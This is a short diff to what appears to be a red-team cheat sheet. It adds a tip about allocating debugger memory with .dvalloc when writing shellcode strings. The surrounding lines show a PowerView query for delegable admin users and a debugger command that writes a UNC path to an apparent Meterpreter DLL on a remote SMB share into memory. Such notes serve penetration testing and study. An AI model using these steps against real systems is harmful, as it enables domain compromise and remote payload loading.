@@ -103,6 +103,7 @@ Get-DomainUser -AllowDelegation -AdminCount -Properties distinguishedname -Crede
 ### ASCII to DWORDS
 - Create DWORDS from an ASCII string, useful for in terms of, e.g. shellcoding
 - Same works for `unicode` with `eu`
+- Be aware it might be more reasonbale to use `.dvalloc` to allocate some space and use this, instead of messing around with `rsp`
 
 ```powershell
 ea rsp+8 "\\\\192.168.73.128\\pwn\\met.dll"
